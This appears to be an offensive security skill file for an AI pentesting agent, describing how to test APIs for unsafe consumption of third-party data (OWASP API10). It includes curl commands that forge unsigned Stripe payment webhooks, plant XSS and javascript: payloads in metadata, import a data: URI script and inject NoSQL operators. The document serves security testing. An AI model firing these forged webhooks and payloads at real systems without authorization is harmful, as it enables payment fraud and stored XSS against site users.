---
name: api-unsafe-third-party-consumption
description: Testing whether the target trusts data from third-party APIs, webhooks, or callbacks without sufficient validation, enabling injection, logic bypass, or data poisoning
intent: offensive
---

# API Unsafe Third-Party Consumption (OWASP API10)

## Purpose
Test whether the target API consumes data from external services (webhooks, payment callbacks, identity providers, enrichment APIs) without properly validating the input, enabling data poisoning, injection, or trust-boundary failures.

## Preconditions
- The target accepts data from a third-party source (webhook, callback, API response, OAuth provider)
- You can influence the data the third party sends (or simulate it)

## Distinction from SSRF
- **SSRF** (API7): The TARGET sends a request to an unintended destination
- **Unsafe consumption** (API10): The TARGET trusts and mishandles data returned/provided by another API

## Attack Surface Signals
- Webhook endpoints (Stripe, PayPal, GitHub, Slack, etc.)
- Payment processor callbacks
- Identity provider (IdP) data ingestion (OAuth userinfo, SAML assertions, SSO)
- Third-party enrichment APIs (email verification, credit checks, address validation)
- External feed/RSS import
- Remote image/document/file ingestion
- Shipping/tracking API responses
- Third-party authentication flows (sign in with Google/GitHub)
- External data imports (CSV, JSON, XML from a URL)

## Methodology

### Step 1: Identify Third-Party Data Ingestion Points
Map where the target accepts external data:
- What fields from the third-party response are consumed?
- Are they stored, displayed, or used in logic decisions?
- Is there signature/HMAC validation?

### Step 2: Test Webhook Payload Injection
```bash
# If you control the webhook source (e.g., you registered a webhook):
# Send a webhook with malicious payload in fields the target processes

curl -sk -X POST "https://TARGET/webhooks/stripe" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "payment_intent.succeeded",
    "data": {
      "object": {
        "id": "pi_test123",
        "amount": 100,
        "metadata": {
          "user_id": "<img src=x onerror=alert(1)>",
          "callback_url": "javascript:alert(1)"
        }
      }
    }
  }'

# Check: does the metadata get stored and rendered without sanitization?
```

### Step 3: Test Missing Signature Validation
```bash
# Check if the webhook validates the signature
# Send a webhook WITHOUT the signature header
curl -sk -X POST "https://TARGET/webhooks/stripe" \
  -H "Content-Type: application/json" \
  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":999999}}}'

# If accepted without Stripe-Signature header → missing validation

# Try with an invalid signature
curl -sk -X POST "https://TARGET/webhooks/stripe" \
  -H "Stripe-Signature: t=1,v1=invalid" \
  -H "Content-Type: application/json" \
  -d '{"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake"}}}'
```

### Step 4: Test OAuth/IdP Data Poisoning
```bash
# If the target consumes user profile data from an IdP:
# Can you control the data sent in the OAuth userinfo response?

# Test: set your profile email/username on the IdP to contain injection
# Then trigger the OAuth flow on the target
# Does the target trust the email from the IdP without validation?
```

### Step 5: Test Third-Party URL/Redirect Handling
```bash
# If the target follows URLs from third-party responses:
# Can the third-party response contain a redirect to an internal service?
# Or a data: URI, file: URI, or javascript: URI?

curl -sk -X POST "https://TARGET/api/import" \
  -H "Content-Type: application/json" \
  -d '{"source_url":"data:text/html,<script>alert(1)</script>"}'
```

### Step 6: Test Upstream Schema Drift
```bash
# If the target expects a specific JSON structure from an upstream API:
# What happens when the upstream sends unexpected types?

curl -sk -X POST "https://TARGET/api/webhooks/custom" \
  -H "Content-Type: application/json" \
  -d '{"user_id": {"$gt": ""}, "amount": "not_a_number"}'

# Test type confusion: string vs int, null vs object, array vs object
```

### Step 7: Test Trust Boundary Failures
```bash
# If the target uses third-party data for authorization decisions:
# Can you manipulate the third-party data to bypass access control?

# e.g., target trusts the "role" field from the IdP response
# Can you get the IdP to send a different role?

# If the target trusts "email_verified": true from an unverified source:
# Can you create an account with email_verified=true without actually verifying?
```

## Evidence Contract

An unsafe-consumption finding requires:
1. The third-party data source is identified (webhook, IdP, API)
2. The target accepts data from that source
3. The manipulated data caused a concrete security impact:
   - XSS in stored webhook metadata
   - Authorization bypass via manipulated IdP claim
   - Injection via unvalidated third-party field
   - State change from a forged webhook event
4. The target did NOT validate the data (or validation was bypassable)

**NOT evidence**: The webhook endpoint exists, a third-party API is used, a 200 response from the webhook receiver

## Common Misses
- Webhook endpoints that accept unsigned/incorrectly signed payloads
- IdP profile data (email, name, role) trusted without local validation
- Third-party API responses used in server-side template rendering
- External feeds that allow HTML/JavaScript injection
- Payment callbacks that update order status without server-side verification
- Data imports from external URLs that don't validate content type

## False Positives / Non-Findings
- Webhook exists but properly validates HMAC signatures
- Third-party data is used only for display and is properly escaped
- The target makes its own request to the third-party (that's SSRF, not consumption)
- A webhook endpoint that requires a secret token you don't have

## Xalgorix Tool Strategy
- `terminal_execute` with curl for webhook payload crafting
- `http_request` for precise header/content-type manipulation
- `oob_callback` for verifying webhook-driven SSRF (when consumption leads to URL fetching)
- `agentmail` for testing email-based ingestion endpoints

## Stopping Rule
Test every identified third-party data ingestion point for: signature validation, input sanitization, type confusion, authorization bypass, and injection.

## Handoff
Report each confirmed unsafe-consumption issue with the data source, the manipulated field, the validation that was missing, and the concrete impact.
